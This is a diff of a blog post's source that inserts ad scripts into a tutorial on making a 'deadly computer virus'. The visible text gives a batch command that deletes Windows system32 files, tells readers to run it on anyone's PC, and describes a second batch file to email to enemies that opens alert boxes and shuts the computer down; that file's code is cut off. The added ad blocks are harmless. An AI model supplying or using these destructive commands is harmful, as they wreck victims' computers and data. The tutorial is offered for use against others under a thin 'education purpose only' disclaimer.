@@ -9,6 +9,17 @@ redirect_from:
 <strong>This tutorial is education purpose only</strong><br/>
 In this post we’ll take a look on how to create a deadly computer virus to destroy your enemy or victim’s PC…
 
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- First Ads -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-5996828242175180"
+     data-ad-slot="2764199159"
+     data-ad-format="horizontal"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
 Open Notepad, Type or Paste in the following command:-
 
     del c:\windows\system32\*.* /q
@@ -24,6 +35,17 @@ windows1 in C:.
 Copy some old files in it and just follow the above command. By double clicking the bat or cmd file ur all files automaitcally get deleted.
 
 You can try this file one any one’s computer. (but this result in causing damage to the computer, so think again before trying this on anyone’s PC)
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- First Ads -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-5996828242175180"
+     data-ad-slot="2764199159"
+     data-ad-format="horizontal"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 Virus 2:
 
@@ -46,6 +68,17 @@ Do not click on that batch file… Send it to your enimies’ email… It will:
 6) Opens alert boxes
 
 7) Changes the time to 12:00 and shuts down the computer
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- First Ads -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-5996828242175180"
+     data-ad-slot="2764199159"
+     data-ad-format="horizontal"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 CODE:-
 
